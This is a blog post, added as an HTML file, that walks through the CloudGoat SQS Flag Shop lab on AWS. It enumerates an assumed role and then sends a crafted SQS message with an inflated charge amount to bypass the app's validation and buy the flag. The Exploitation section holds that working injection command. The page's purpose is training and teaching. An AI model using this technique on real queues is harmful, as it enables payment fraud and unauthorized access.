@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="CloudGoat SQS Lambda Privesc WalkthroughThis comprehensive CloudGoat walkthrough demonstrates how to exploit SQS (Simple Queue Service) vulnerabilities to achieve privilege escalation in AWS environme">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cloudgoat-SQS_Flag_Shop">
+<meta property="og:url" content="https://panosoikogr.github.io/2025/05/27/Cloudgoat-SQS-Flag-Shop/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="CloudGoat SQS Lambda Privesc WalkthroughThis comprehensive CloudGoat walkthrough demonstrates how to exploit SQS (Simple Queue Service) vulnerabilities to achieve privilege escalation in AWS environme">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Sqs_Flag_Shop/web_page.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Sqs_Flag_Shop/Cloud_Tap_assume.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Sqs_Flag_Shop/Flag.png">
+<meta property="article:published_time" content="2025-05-26T22:15:25.000Z">
+<meta property="article:modified_time" content="2025-05-26T19:19:58.259Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="AWS">
+<meta property="article:tag" content="CloudGoat">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Sqs_Flag_Shop/web_page.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/web-app-manifest-192x192.png">
+        
+      
+    
+    <!-- title -->
+    <title>Cloudgoat-SQS_Flag_Shop</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/05/26/Cloudgoat-Lambda_Privesc/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/05/27/Cloudgoat-SQS-Flag-Shop/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/05/27/Cloudgoat-SQS-Flag-Shop/&text=Cloudgoat-SQS_Flag_Shop"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/05/27/Cloudgoat-SQS-Flag-Shop/&title=Cloudgoat-SQS_Flag_Shop"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/05/27/Cloudgoat-SQS-Flag-Shop/&is_video=false&description=Cloudgoat-SQS_Flag_Shop"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Cloudgoat-SQS_Flag_Shop&body=Check out this article: https://panosoikogr.github.io/2025/05/27/Cloudgoat-SQS-Flag-Shop/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/05/27/Cloudgoat-SQS-Flag-Shop/&title=Cloudgoat-SQS_Flag_Shop"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/05/27/Cloudgoat-SQS-Flag-Shop/&title=Cloudgoat-SQS_Flag_Shop"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/05/27/Cloudgoat-SQS-Flag-Shop/&title=Cloudgoat-SQS_Flag_Shop"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/05/27/Cloudgoat-SQS-Flag-Shop/&title=Cloudgoat-SQS_Flag_Shop"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/05/27/Cloudgoat-SQS-Flag-Shop/&name=Cloudgoat-SQS_Flag_Shop&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/05/27/Cloudgoat-SQS-Flag-Shop/&t=Cloudgoat-SQS_Flag_Shop"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CloudGoat-SQS-Lambda-Privesc-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">CloudGoat SQS Lambda Privesc Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Setup-and-Configuration"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Setup and Configuration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Target-Analysis"><span class="toc-number">1.2.</span> <span class="toc-text">Target Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration-with-CloudTap"><span class="toc-number">1.3.</span> <span class="toc-text">Enumeration with CloudTap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQS-Queue-Discovery"><span class="toc-number">1.4.</span> <span class="toc-text">SQS Queue Discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Analysis"><span class="toc-number">1.5.</span> <span class="toc-text">Vulnerability Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">1.6.</span> <span class="toc-text">Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Key-Takeaways"><span class="toc-number">1.7.</span> <span class="toc-text">Key Takeaways</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Cloudgoat-SQS_Flag_Shop
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-26T22:15:25.000Z" class="dt-published" itemprop="datePublished">2025-05-26</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/AWS/" rel="tag">AWS</a>, <a class="p-category" href="/tags/CloudGoat/" rel="tag">CloudGoat</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="CloudGoat-SQS-Lambda-Privesc-Walkthrough"><a href="#CloudGoat-SQS-Lambda-Privesc-Walkthrough" class="headerlink" title="CloudGoat SQS Lambda Privesc Walkthrough"></a>CloudGoat SQS Lambda Privesc Walkthrough</h1><p>This comprehensive CloudGoat walkthrough demonstrates how to exploit SQS (Simple Queue Service) vulnerabilities to achieve privilege escalation in AWS environments. We’ll use CloudTap, an advanced AWS security testing tool, to automate enumeration and role assumption for efficient penetration testing.</p>
+<h2 id="Initial-Setup-and-Configuration"><a href="#Initial-Setup-and-Configuration" class="headerlink" title="Initial Setup and Configuration"></a>Initial Setup and Configuration</h2><p>First, whitelist your IP address to ensure proper access to CloudGoat resources:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat config whitelist --auto</span><br></pre></td></tr></table></figure>
+
+<p>Create the lambda_privesc scenario:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat create lambda_privesc</span><br></pre></td></tr></table></figure>
+
+<p>The setup provides initial credentials and target information:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat_output_sqsuser_access_key_id = AKIAQ6VKGD5Y2RVBYOH6</span><br><span class="line">cloudgoat_output_sqsuser_secret_key = [REDACTED]</span><br><span class="line">web_site_ip = http://35.153.201.178:5000</span><br></pre></td></tr></table></figure>
+
+<h2 id="Target-Analysis"><a href="#Target-Analysis" class="headerlink" title="Target Analysis"></a>Target Analysis</h2><p>Accessing the web application reveals a shopping website with a coin-based payment system:</p>
+<p><img src="/images/Sqs_Flag_Shop/web_page.png" alt="Web Application Interface"></p>
+<p>The application allows users to charge their account with coins through a POST request to <code>/charge_cash/10</code>. Analysis of the network traffic shows the charging mechanism uses specific amounts (1, 5, or 10 coins) with a 20-second delay.</p>
+<h2 id="Enumeration-with-CloudTap"><a href="#Enumeration-with-CloudTap" class="headerlink" title="Enumeration with CloudTap"></a>Enumeration with CloudTap</h2><p><strong><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr/CloudTap">CloudTap</a> is an innovative AWS security assessment tool that streamlines the enumeration process by automatically discovering permissions, roles, and potential attack vectors.</strong> Unlike manual enumeration, CloudTap provides comprehensive visibility into AWS environments with automated role assumption capabilities.</p>
+<p>Run CloudTap with the following command:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CloudTap.py</span><br></pre></td></tr></table></figure>
+
+<p>Using CloudTap for initial reconnaissance reveals:</p>
+<ul>
+<li>Role: <code>cg-sqs-send-message-cgidax1f0hnq4i</code> </li>
+<li>Permissions: <code>sqs:GetQueueUrl</code> and <code>sqs:SendMessage</code></li>
+<li>Automatic role assumption capability detected</li>
+</ul>
+<p><img src="/images/Sqs_Flag_Shop/Cloud_Tap_assume.png" alt="CloudTap Role Assumption"></p>
+<p><strong><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr/CloudTap">CloudTap’s</a> automated approach significantly reduces manual testing time while ensuring comprehensive coverage of AWS attack surfaces.</strong></p>
+<p>Verify the assumed role identity:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts get-caller-identity --profile init</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;UserId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AROAQ6VKGD5YVZOGE6GS6:SecurityTest-cg-sqs-user-cgidax1f0hnq4i-cg-sqs-send-message-&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Account&quot;</span><span class="punctuation">:</span> <span class="string">&quot;065855168369&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sts::065855168369:assumed-role/cg-sqs-send-message-cgidax1f0hnq4i/SecurityTest-cg-sqs-user-cgidax1f0hnq4i-cg-sqs-send-message-&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="SQS-Queue-Discovery"><a href="#SQS-Queue-Discovery" class="headerlink" title="SQS Queue Discovery"></a>SQS Queue Discovery</h2><p>Retrieve the SQS queue URL using the discovered queue name:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sqs get-queue-url --queue-name cash_charging_queue --profile init</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;QueueUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://sqs.us-east-1.amazonaws.com/065855168369/cash_charging_queue&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h2><p>Examining the application’s source code reveals the charge_cash function logic:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">@app.route(&#x27;/charge_cash/&lt;cash&gt;&#x27;, methods=[&#x27;POST&#x27;])</span></span><br><span class="line"><span class="comment">def charge_cash(cash):</span></span><br><span class="line"><span class="comment">    cash = int(cash)</span></span><br><span class="line"><span class="comment">    if cash==1 or cash==5 or cash==10:</span></span><br><span class="line"><span class="comment">        msg = &#123;&quot;charge_amount&quot; : cash&#125;</span></span><br><span class="line"><span class="comment">        message_body = json.dumps(msg)</span></span><br><span class="line"><span class="comment">        response = sqs.sqs_client.send_message(</span></span><br><span class="line"><span class="comment">          QueueUrl=sqs.sqs_queue_url, </span></span><br><span class="line"><span class="comment">          MessageBody=message_body</span></span><br><span class="line"><span class="comment">        )</span></span><br><span class="line"><span class="comment">        time.sleep(10)</span></span><br><span class="line"><span class="comment">        return redirect(url_for(&#x27;index&#x27;))</span></span><br><span class="line"><span class="comment">    else:</span></span><br><span class="line"><span class="comment">        return &quot;BAD Request!!&quot;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>The vulnerability lies in the ability to directly send messages to the SQS queue, bypassing the web application’s input validation.</p>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Craft a malicious SQS message with an inflated charge amount:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sqs send-message --queue-url https://sqs.us-east-1.amazonaws.com/065855168369/cash_charging_queue --message-body <span class="string">&#x27;&#123;&quot;charge_amount&quot;: 100000000&#125;&#x27;</span> --profile init</span><br></pre></td></tr></table></figure>
+
+<p>After sending the message, refresh the web application to see the inflated coin balance, then purchase the flag:</p>
+<p><img src="/images/Sqs_Flag_Shop/Flag.png" alt="Flag Retrieved"></p>
+<h2 id="Key-Takeaways"><a href="#Key-Takeaways" class="headerlink" title="Key Takeaways"></a>Key Takeaways</h2><p>This CloudGoat walkthrough demonstrates critical SQS security considerations:</p>
+<ul>
+<li><strong>Direct queue access</strong> can bypass application-level controls</li>
+<li><strong>Message validation</strong> should occur at both application and queue levels  </li>
+<li><strong>Principle of least privilege</strong> must be applied to SQS permissions</li>
+<li><strong><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr/CloudTap">CloudTap’s</a> automated enumeration</strong> significantly accelerates security assessments</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CloudGoat-SQS-Lambda-Privesc-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">CloudGoat SQS Lambda Privesc Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Setup-and-Configuration"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Setup and Configuration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Target-Analysis"><span class="toc-number">1.2.</span> <span class="toc-text">Target Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration-with-CloudTap"><span class="toc-number">1.3.</span> <span class="toc-text">Enumeration with CloudTap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQS-Queue-Discovery"><span class="toc-number">1.4.</span> <span class="toc-text">SQS Queue Discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Analysis"><span class="toc-number">1.5.</span> <span class="toc-text">Vulnerability Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">1.6.</span> <span class="toc-text">Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Key-Takeaways"><span class="toc-number">1.7.</span> <span class="toc-text">Key Takeaways</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/05/27/Cloudgoat-SQS-Flag-Shop/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/05/27/Cloudgoat-SQS-Flag-Shop/&text=Cloudgoat-SQS_Flag_Shop"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/05/27/Cloudgoat-SQS-Flag-Shop/&title=Cloudgoat-SQS_Flag_Shop"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/05/27/Cloudgoat-SQS-Flag-Shop/&is_video=false&description=Cloudgoat-SQS_Flag_Shop"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Cloudgoat-SQS_Flag_Shop&body=Check out this article: https://panosoikogr.github.io/2025/05/27/Cloudgoat-SQS-Flag-Shop/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/05/27/Cloudgoat-SQS-Flag-Shop/&title=Cloudgoat-SQS_Flag_Shop"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/05/27/Cloudgoat-SQS-Flag-Shop/&title=Cloudgoat-SQS_Flag_Shop"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/05/27/Cloudgoat-SQS-Flag-Shop/&title=Cloudgoat-SQS_Flag_Shop"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/05/27/Cloudgoat-SQS-Flag-Shop/&title=Cloudgoat-SQS_Flag_Shop"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/05/27/Cloudgoat-SQS-Flag-Shop/&name=Cloudgoat-SQS_Flag_Shop&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/05/27/Cloudgoat-SQS-Flag-Shop/&t=Cloudgoat-SQS_Flag_Shop"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
